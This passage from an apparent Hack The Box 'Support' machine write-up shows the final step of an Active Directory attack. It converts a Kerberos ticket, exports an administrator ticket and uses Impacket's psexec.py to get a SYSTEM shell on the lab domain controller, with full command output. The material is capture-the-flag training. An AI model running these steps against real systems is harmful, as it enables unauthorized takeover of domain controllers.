- Now, we need to convert it to a format that Impact can use:

```bash
┌──(kali㉿kali)-[~/htb/machines/support/tickets]
└─$ impacket-ticketConverter ticket.kirbi ticket.ccache
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] converting kirbi to ccache...
[+] done
``` 

### Ticket from getST.py
Using `getST` we already have `administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache` ticket ready to use.
- Export the ticket to export `KRB5CCNAME` as the follow:

```bash
╭─kali@kali ~/htb/machines/support/krb/tt 
╰─$ export KRB5CCNAME=administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```


- Then We can use this to get a shell using `psexec.py`:


```bash
╭─kali@kali ~/htb/machines/support/krb/tt 
╰─$ /usr/share/doc/python3-impacket/examples/psexec.py -k -no-pass support.htb/administrator@dc.support.htb -dc-ip 10.10.11.174                                                                          130 ↵
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Requesting shares on dc.support.htb.....
[*] Found writable share ADMIN$
[*] Uploading file oROGuPYt.exe
[*] Opening SVCManager on dc.support.htb.....
[*] Creating service ZRTb on dc.support.htb.....
[*] Starting service ZRTb.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.859]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> cd \users
C:\Users> cd Administrator

C:\Users\Administrator> whoami & hostname
nt authority\system
dc

C:\Users\Administrator> 
``` 

## Troubleshooting

- **Kerberos Errors**: Ensured system time synchronization using `ntpdate` to avoid ticket issues.
- **WinRM Failure**: If WinRM failed, `impacket-smbexec` was an alternative.
